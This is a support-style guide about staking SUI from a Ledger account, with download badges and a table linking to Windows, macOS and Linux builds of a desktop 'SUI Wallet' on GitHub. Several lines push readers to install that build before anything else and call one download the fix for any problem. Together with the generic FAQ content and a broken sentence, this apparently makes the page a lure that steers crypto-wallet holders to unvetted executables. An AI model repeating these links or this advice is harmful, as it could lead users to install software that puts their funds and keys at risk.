![SUI Wallet](assets/banner-article.png)

# Staking SUI from a Ledger account

The keys stay on the device; the delegation is still signed there.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Yes: a Ledger account can delegate from this wallet, and the device approves the transaction the same way it
approves a transfer. The reason Ledger Live's Earn section can look empty is that the position belongs to the
account on the chain, and it was created by a different application.

## How a Ledger account stakes

The account's keys never leave the device. The wallet builds the delegate transaction, sends it to the device, and the device shows the details for approval before signing, which is the same path an ordinary transfer takes. Nothing is moved off the device to make it happen.

So staking from a Ledger account is not a special mode. It is the ordinary staking flow with the approval
step moved onto hardware, and it costs the same network fee as any other transaction.
[Pairing Ledger with SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/pairing-ledger-with-sui-wallet.md) covers getting the account into the wallet in the first place.

The one difference from a software account is the waiting state. The wallet shows the request as sent and the device as the thing being waited on, and that is a different message from a transaction that failed.

## What the device shows

A delegate transaction names the validator and the amount. The device displays both before it signs, which is the last chance to notice that the amount or the validator is not the one you intended to commit to. Trust the device screen on that question.

Read the screen rather than the wallet's window. The device is the authority here: whatever it shows is what
it is about to sign, and that is the property hardware exists to provide.
The validator choice is the decision the device cannot make for you.

## Why Ledger Live shows no staking

The Earn section of Ledger Live lists positions that application knows about. A position created by this
wallet is on the chain under the Ledger account, and the chain is the record - but a different application is
not obliged to display it.

That gap produces the most common report in this area: the stake exists, the rewards accrue, and one screen
says otherwise. The check that settles it is the account's position on the chain, read from a wallet that
signs for that address.

## Rewards and returns

Rewards accrue inside the position as epochs pass, and they return with the principal when you unstake, as they do for any account. Nothing about hardware changes the economics; it only changes who approves each transaction. The fee is what decides whether a claim is worth making.

Claiming is a transaction too, so it also needs the device. A claim that would cost more in fees than it
returns is not worth signing, which is a decision the preview makes visible before you commit.

A claim is worth doing when the accrued amount clearly exceeds the fee, and not otherwise. The preview makes that comparison possible before anything is signed, which is the whole reason to read it.

## Unstaking from a Ledger account

The same shape as delegating: the wallet builds it, the device shows it, you approve it. The return of the principal and the accrued rewards is then a network process rather than an instant arrival in the balance. Approve it when the device is ready.

If the device is not connected when the transaction is ready, nothing is lost - the request simply waits for
approval. That waiting state is worth recognising, because it looks like a frozen screen and is not.
[Ledger not detected in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/ledger-not-detected-in-sui-wallet.md) covers the connection failures that produce it.

## When to re-pair, and when not to

Re-pairing is offered without a reset, and a reset is never the answer to a connection problem: it destroys the device's phrase, which has nothing to do with this wallet's account. A cable or a locked device is. Re-pairing costs nothing and changes nothing.

A device that is not detected is a cable, an unlocked-device state, or a competing application holding the
connection. None of those is a reason to wipe anything.
[Installing the Sui app on Ledger](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/installing-the-sui-app-on-ledger.md) covers the device-side app, which has to be installed before any
of the flows above can complete.

Re-pairing itself changes nothing about the account: the same device and the same derivation produce the same address. That is why it is safe to try before anything more drastic.

## The release question

These screens are described from the current release, which fixes the reported connection problems, and [the repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) what changed between builds. If a Ledger flow behaves unlike this page, that is the first thing to rule out. One download either fixes it or removes it from the list.

## FAQ

### Can I stake from a Ledger account in SUI Wallet?

Yes. The wallet builds the delegate transaction and the device approves it, exactly as it approves a
transfer. The keys stay on the device throughout.

### Why is SUI staking not showing in the Ledger Live Earn section?

Because that section lists positions the application knows about, and this one was created elsewhere. The
position is on the chain under your Ledger account regardless of which screen displays it.

### Do I need to install anything on the device?

Yes, the device-side Sui app, before the wallet can talk to it. Without it the account cannot be paired or
asked to sign.

### Can I unstake without the device connected?

No. Unstaking is a transaction, and the device has to approve it. The request waits rather than failing, so
reconnecting is enough.

### Do I have to reset the device to fix a connection problem?

No, and a reset would destroy a phrase unrelated to this wallet. Re-pairing is offered without one; a reset
is a last resort for a different problem entirely.

### Are rewards the same as for a software account?

Yes. The economics belong to the network and the validator, not to the way the key is stored.
